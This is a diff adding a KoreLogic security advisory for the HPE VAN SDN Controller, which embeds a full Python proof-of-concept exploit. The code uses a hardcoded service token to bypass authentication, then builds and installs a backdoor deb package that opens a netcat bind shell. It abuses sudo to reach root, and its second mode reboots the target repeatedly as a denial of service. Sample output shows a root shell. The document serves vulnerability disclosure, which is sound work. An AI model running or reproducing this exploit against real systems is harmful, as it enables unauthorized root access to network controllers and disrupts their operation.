@@ -1,0 +1,401 @@
+'''
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA256
+
+KL-001-2018-008 : HPE VAN SDN Unauthenticated Remote Root Vulnerability
+
+Title: HPE VAN SDN Unauthenticated Remote Root Vulnerability
+Advisory ID: KL-001-2018-008
+Publication Date: 2018.06.25
+Publication URL: https://korelogic.com/Resources/Advisories/KL-001-2018-008.txt
+
+
+1. Vulnerability Details
+
+     Affected Vendor: HP Enterprise
+     Affected Product: VAN SDN Controller
+     Affected Version: 2.7.18.0503
+     Platform: Embedded Linux
+     CWE Classification: CWE-798: Use of Hard-coded Credentials,
+                         CWE-20: Improper Input Validation
+     Impact: Privilege Escalation
+     Attack vector: HTTP
+
+2. Vulnerability Description
+
+     A hardcoded service token can be used to bypass
+     authentication. Built-in functionality can be exploited
+     to deploy and execute a malicious deb file containing a
+     backdoor. A weak sudoers configuration can then be abused to
+     escalate privileges to root. A second issue can be used to
+     deny use of the appliance by continually rebooting it.
+
+3. Technical Description
+
+     The exploit will automatically attempt to bypass authentication
+     unless the --no-auth-bypass flag is provided. If that flag is
+     provided, the --username and --password flags must also be given.
+
+     The options for the --payload flag are: rce-root and
+     pulse-reboot. The default option is rce-root. The pulse-reboot
+     payload will reboot the target device until the attack is stopped.
+
+     $ python hpevansdn-multiple_exploits.py --help
+     HPE VAN SDN Controller 2.7.18.0503
+     Unauthenticated Remote Root and Denial-of-Service
+     
+     Usage: hpevansdn-multiple_exploits.py [options]
+   
+     Options:
+       -h, --help           show this help message and exit
+       --target=REMOTE_IP   Target IP address
+       --no-auth-bypass     No authentication bypass
+       --username=USERNAME  Username (Default: sdn)
+       --password=PASSWORD  Password (Default: skyline)
+       --payload=PAYLOAD    Payload: rce-root(default), pulse-reboot
+   
+     Below is output for the rce-root payload:
+   
+     $ python hpevansdn-multiple_exploits.py --target 1.3.3.7
+     HPE VAN SDN Controller 2.7.18.0503
+     Unauthenticated Remote Root and Denial-of-Service
+   
+     [+] Authentication successfully bypassed.
+     [-] Starting remote root exploit.
+     [-] Building backdoor.
+     [-] Uploading backdoor.
+     [+] Upload successful.
+     [-] Installing backdoor.
+     [+] Starting backdoor on port 49370.
+     [+] Connected to backdoor.
+          * For interactive root shell please run /var/lib/sdn/uploads/root-V6mlQNqW
+     id
+     uid=108(sdnadmin) gid=1000(sdn) groups=1000(sdn)
+     /var/lib/sdn/uploads/root-V6mlQNqW
+     root@medium-hLinux:/opt/sdn/admin# uname -a
+     Linux medium-hLinux 4.4.0-2-amd64-hlinux #hlinux1 SMP Thu Jan 28 12:35:26 UTC 2016 x86_64 GNU/Linux
+     root@medium-hLinux:/opt/sdn/admin# exit
+     [-] Removing backdoor.
+     [+] Backdoor removed.
+
+4. Mitigation and Remediation Recommendation
+
+     The vendor issued the following statement:
+
+     HPE had evaluated the impact of service token being
+     leaked and previously updated the security procedure in
+     VAN 2.8.8 Admin Guide page 129. The full guide is here -
+     http://h20628.www2.hp.com/km-ext/kmcsdirect/emr_na-a00003662en_us-1.pdf.
+
+     HPE expects all customers to update their service token,
+     admin token, default sdn user password, and edit iptables as
+     described in the guideline. If the guideline was followed,
+     the exploit would not be successful.
+
+5. Credit
+
+     This vulnerability was discovered by Matt Bergin (@thatguylevel)
+     of KoreLogic, Inc.
+
+6. Disclosure Timeline
+
+     2018.02.16 - KoreLogic submits vulnerability details to HPE.
+     2018.02.16 - HPE acknowledges receipt.
+     2018.04.02 - 30 business days have elapsed since the vulnerability
+                  was reported to HPE.
+     2018.04.23 - 45 business days have elapsed since the vulnerability
+                  was reported to HPE.
+     2018.05.04 - KoreLogic requests an update on the status of the
+                  remediation.
+     2018.05.14 - 60 business days have elapsed since the vulnerability
+                  was reported to HPE.
+     2018.06.05 - 75 business days have elapsed since the vulnerability
+                  was reported to HPE.
+     2018.06.11 - KoreLogic requests an update on the status of the
+                  remediation.
+     2018.06.12 - HPE responds with the statement documented in Section
+                  4. Mitigation and Remediation Recommendation.
+     2018.06.25 - KoreLogic public disclosure.
+
+7. Proof of Concept
+'''
+
+     from optparse import OptionParser
+     from random import randrange,choice
+     from threading import Thread
+     from os import mkdir,makedirs,system,listdir,remove
+     from string import ascii_letters,digits
+     from subprocess import check_output
+     from requests import get,post
+     from requests.utils import dict_from_cookiejar
+     from requests.exceptions import ConnectionError
+     from time import sleep
+     from sys import exit
+     from json import dumps
+     
+     #################################
+     # PULSE REBOOT TIMER IN SECONDS #
+     pulse_timer = 60                #
+     #################################
+     
+     banner = """HPE VAN SDN Controller 2.7.18.0503
+     Unauthenticated Remote Root and Denial-of-Service
+     """.center(80)
+     
+     class Backdoor:
+         def __init__(self):
+             ######################################################################################
+             # ATTACK SHELL SCRIPT                                                                #
+             self.backdoor_port = randrange(50000,55000)                                          #
+             self.backdoor_script = """#!/bin/sh\nnc -l -p PORT -e /bin/bash &""" # DONT CHANGE   #
+             self.backdoor_dir = '%s-1.0.0' % ''.join(                                            #
+                 [choice(digits + ascii_letters) for i in xrange(8)]                              #
+                 )                                                                                #
+             self.backdoor_script = self.backdoor_script.replace('PORT',str(self.backdoor_port))  #
+             ######################################################################################
+             self.cmd_name = ''.join([choice(digits + ascii_letters) for i in xrange(8)])
+             return None
+         def generate(self):
+             print '[-] Building backdoor.'
+             control_template = """Source: %s
+     Section: misc
+     Priority: extra
+     Maintainer: None
+     Homepage: http://127.0.0.1/
+     Version: 1.0.0
+     Package: %s
+     Architecture: all
+     Depends:
+     Description: %s
+     """ % (self.backdoor_dir,self.cmd_name,self.backdoor_dir)
+             try:
+                 mkdir(self.backdoor_dir)
+                 mkdir('%s/%s' % (self.backdoor_dir,'DEBIAN'))
+                 fp = open('%s/%s/control' % (self.backdoor_dir,'DEBIAN'),'w')
+                 fp.write(control_template)
+                 fp.close()
+                 makedirs('%s/var/lib/sdn/uploads/tmp' % (self.backdoor_dir))
+                 fp = open('%s/var/lib/sdn/uploads/tmp/%s' % (self.backdoor_dir,self.cmd_name),'w')
+                 fp.write(self.backdoor_script)
+                 fp.close()
+                 fp = open('%s/var/lib/sdn/uploads/root-%s' % (self.backdoor_dir,self.cmd_name),'w')
+                 fp.write("""#!/bin/sh\nsudo -u sdn /usr/bin/sudo python -c 'import pty;pty.spawn("/bin/bash")'""")
+                 fp.close()
+                 system('chmod a+x %s/var/lib/sdn/uploads/tmp/%s' % (self.backdoor_dir,self.cmd_name))
+                 system('chmod a+x %s/var/lib/sdn/uploads/root-%s' % (self.backdoor_dir,self.cmd_name))
+                 if "dpkg-deb: building package" not in check_output(
+                     ['/usr/bin/dpkg-deb', '--build', '%s/' % (self.backdoor_dir)]
+                     ):
+                         print '[!] Could not build attack deb file. Reason: DPKG failure.'
+             except Exception as e:
+                 print '[!] Could not build attack deb file. Reason: %s.' % (e)
+             return '%s.deb' % self.backdoor_dir,self.cmd_name,self.backdoor_port
+     
+     class HTTP:
+         def __init__(self):
+             return None
+         def is_service_token_enabled(self):
+             url = 'https://%s:8443/sdn/ui/app/rs/hpws/config' % (self.target)
+             try:
+                 r = get(url, headers={"X-Auth-Token":self.session_token,"User-Agent":self.user_agent}, verify=False, allow_redirects=False)
+                 if r.status_code == 200:
+                     return True
+             except ConnectionError:
+                 print '[!] Connection to target service failed.'
+                 exit(1)
+             return False
+         def get_session_token(self):
+             url = 'https://%s:8443/sdn/ui/app/login' % (self.target)
+             try:
+                 r = post(url, headers={"User-Agent":self.user_agent},verify=False, data="username=%s&password=%s" % (self.username,self.password), allow_redirects=False)
+                 if r.status_code == 303:
+                     self.session_token = dict_from_cookiejar(r.cookies)['X-Auth-Token']
+                     return True
+             except ConnectionError:
+                 print '[!] Connection to target service failed.'
+                 exit(1)
+             return False
+         def upload_deb(self):
+             print '[-] Uploading backdoor.'
+             url = 'https://%s:8081/upload' % (self.target)
+             try:
+                 fp = open('%s' % (self.deb_name),'rb')
+                 data = fp.read()
+                 fp.close()
+                 try:
+                     r = post(url,headers={"X-Auth-Token":self.session_token,"Filename":self.deb_name,"User-Agent":self.user_agent},verify=False,data=data)
+                     if r.status_code == 200:
+                         print '[+] Upload successful.'
+                         return True
+                     else:
+                         print '[!] Upload failed. Please try again.'
+                 except ConnectionError:
+                     print '[!] Connection to target service failed.'
+                     exit(1)
+             except Exception as e:
+                 print '[!] Failed to write backdoor to disk. Reason: %s.' % (e)
+             return False
+         def install_deb(self):
+             print '[-] Installing backdoor.'
+             url = 'https://%s:8081/' % (self.target)
+             post_body = dumps({"action":"install","name":self.deb_name})
+             try:
+                 r = post(url,headers={"X-Auth-Token":self.session_token,"User-Agent":self.user_agent},verify=False,data=post_body)
+                 if r.status_code == 200:
+                     return True
+             except ConnectionError:
+                 print '[!] Connection to target service failed.'
+                 exit(1)
+             return False
+         def start_shell(self):
+             print '[+] Starting backdoor on port %d.' % (self.backdoor_port)
+             url = 'https://%s:8081/' % (self.target)
+             post_body = dumps({"action":"exec","name":self.cmd_name})
+             try:
+                 r = post(url,headers={"X-Auth-Token":self.session_token,"User-Agent":self.user_agent},verify=False,data=post_body)
+                 if r.status_code == 200:
+                     return True
+             except ConnectionError:
+                 print '[!] Connection to target service failed.'
+                 exit(1)
+             return False
+         def uninstall_deb(self):
+             print '[-] Removing backdoor.'
+             url = 'https://%s:8081/' % (self.target)
+             post_body = dumps({"action":"uninstall","name":self.deb_name})
+             try:
+                 r = post(url,headers={"X-Auth-Token":self.session_token,"User-Agent":self.user_agent},verify=False,data=post_body)
+                 if r.status_code == 200:
+                     return True
+             except ConnectionError:
+                 print '[!] Connection to target service failed.'
+                 exit(1)
+             return False
+         def send_reboot(self):
+             print '[+] Sending reboot.'
+             url = 'https://%s:8081/' % (self.target)
+             post_body = dumps({"action":"reboot"})
+             try:
+                 r = post(url,headers={"X-Auth-Token":self.session_token,"User-Agent":self.user_agent},verify=False,data=post_body)
+             except ConnectionError:
+                 print '[!] Connection to target service failed.'
+                 exit(1)
+             return False
+     
+     class Exploit(HTTP):
+         def __init__(self,target=None,noauthbypass=None,
+                      username=None,password=None,payload=None):
+                         self.target = target
+                         self.noauthbypass = noauthbypass
+                         self.username = username
+                         self.password = password
+                         self.payload = payload
+                         self.deb_name = ''
+                         self.cmd_name = ''
+                         self.backdoor_port = 0
+                         self.session_token = 'AuroraSdnToken37'
+                         self.user_agent = choice(['Mozilla/5.0 (X11; U; Linux x86_64; en-ca) AppleWebKit/531.2+ (KHTML, like Gecko) Version/5.0 Safari/531.2+',
+                                             'Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_4_11; it-it) AppleWebKit/525.27.1 (KHTML, like Gecko) Version/3.2.1 Safari/525.27.1',
+                                             'Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; SV1; .NET CLR 1.1.4322; .NET CLR 1.0.3705; .NET CLR 2.0.50727)',
+                                             'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Ubuntu/10.10 Chromium/8.0.552.237 Chrome/8.0.552.237 Safari/534.10'])
+                         return None
+         def drop_root(self):
+             sleep(3)
+             print '[+] Connected to backdoor.\n\t* For interactive root shell please run /var/lib/sdn/uploads/root-%s' % (self.cmd_name)
+             system('nc %s %s' % (self.target,self.backdoor_port))
+             return False
+         def run(self):
+             if not self.is_service_token_enabled() or self.noauthbypass == True:
+                 print '[-] Authentication bypass failed or running with --no-auth-bypass. Attempting login.'
+                 if not self.get_session_token():
+                     print '[!] Login failed. Exploit failed.'
+                     exit(1)
+             else:
+                 print '[+] Authentication successfully bypassed.'
+             if self.payload == 'rce-root':
+                 print '[-] Starting remote root exploit.'
+                 self.deb_name, self.cmd_name, self.backdoor_port = Backdoor().generate()
+                 if self.upload_deb():
+                     if self.install_deb():
+                         Thread(target=self.start_shell,args=(),name="shell-%s" % (self.cmd_name)).start()
+                         try:
+                             self.drop_root()
+                         except KeyboardInterrupt:
+                             print '[-] Disconnecting from backdoor.'
+                             return True
+                         if self.uninstall_deb():
+                             print '[+] Backdoor removed.'
+                         else:
+                             print '[!] Could not remove backdoor.'
+                         return True
+                     else:
+                         print '[!] Failed to install backdoor.'
+                         exit(1)
+                 else:
+                     print '[!] Failed to upload backdoor.'
+                     exit(1)
+                 print "[-] Please remember to srm %s and the build directory %s/" % (self.deb_name,self.deb_name.replace('.deb',''))
+             else:
+                 print '[-] Starting pulse reboot exploit.'
+                 while True:
+                     try:
+                         self.send_reboot()
+                         sleep(pulse_timer)
+                     except KeyboardInterrupt:
+                         print '[-] Reboot pulse Denial-of-Service stopped.'
+                         break
+             return False
+     
+     if __name__=="__main__":
+         print banner
+         parser = OptionParser()
+         parser.add_option("--target",dest="remote_ip",default='',help="Target IP address")
+         parser.add_option("--no-auth-bypass",action="store_true",default=False,help="No authentication bypass")
+         parser.add_option("--username",dest="username",default="sdn",help="Username (Default: sdn)")
+         parser.add_option("--password",dest="password",default="skyline",help="Password (Default: skyline)")
+         parser.add_option("--payload",dest="payload",default='rce-root',help="Payload: rce-root(default), pulse-reboot")
+         o, a = parser.parse_args()
+         if o.remote_ip != '':
+             Exploit(target=o.remote_ip,
+                     noauthbypass=o.no_auth_bypass,
+                     username=o.username,
+                     password=o.password,
+                     payload=o.payload).run()
+         else:
+             print '[!] --target must be supplied.'
+
+'''
+The contents of this advisory are copyright(c) 2018
+KoreLogic, Inc. and are licensed under a Creative Commons
+Attribution Share-Alike 4.0 (United States) License:
+http://creativecommons.org/licenses/by-sa/4.0/
+
+KoreLogic, Inc. is a founder-owned and operated company with a
+proven track record of providing security services to entities
+ranging from Fortune 500 to small and mid-sized companies. We
+are a highly skilled team of senior security consultants doing
+by-hand security assessments for the most important networks in
+the U.S. and around the world. We are also developers of various
+tools and resources aimed at helping the security community.
+https://korelogic.com/about-korelogic.html
+
+Our public vulnerability disclosure policy is available at:
+https://korelogic.com/KoreLogic-Public-Vulnerability-Disclosure-Policy.v2.3.txt
+-----BEGIN PGP SIGNATURE-----
+
+iQJOBAEBCAA4FiEETtzSIGy8wE6Vn0geUk0uR1lFz/MFAlsxL1caHGRpc2Nsb3N1
+cmVzQGtvcmVsb2dpYy5jb20ACgkQUk0uR1lFz/OLgA/+I4R5zIz93rYS6VZBbMcD
+6fQYup7o9yGkjSOyhTYMWJYL1BXMJHz534OUX54/vkvhoxdkhb4ouGIYneB+lXCb
+WcPHGAkk094K50z9e3OXcsw3hDNS2lfQVS9IaHxR7iae4zRk6DQQYCBYgfPhi3+5
+x9SkBV516WPM3iyu4Bgx19FTBcx3yXLRruGAftrceIiVdlUDrQbuu3Sht0oa3VBh
+36mGDld7NS+vFHFJwTxbkBwodKViwDTzsYtnh0JId5ICp2a3PAR75Rwnbr+zt8SW
+byD5CgA9szpSf7Sa6H8NnhGSKC47zXQ0K4uZsEJtkHqySjq0jvw1RngnIdJWnTFz
+E6cEL7evsySeMKOoO1q8A0DpUigVFan3dxdaAE7uT9z2pN1RmRJglR8RiQo/L6ML
+rKFhePlfsuqJon+Ux/R5XhKgT3oQbGwz/yaV1jSUujO+qqs0yI/pEIzhkj35Ovai
+k9SiNQgIm8BvrIyA2nUI1xn32Pk2PFqh77gti5HVS3JExHsMPm5c3ZjKhw3/dS3d
+wXeoeL7Vh+z2I0q9E2GzLSUqxh/vsYdlbcPprgH7GGsVElEhBprsw0AmNk7lh4e4
+OwKI54tp0wbRewszQp8p9bbehwD+b4uFhqpD54w48yq3Ntv3/B07OprKWjEQUQC2
+GKUgtPVRc8ZwJV+2c+MYICU=
+=mzf4
+-----END PGP SIGNATURE-----
+'''
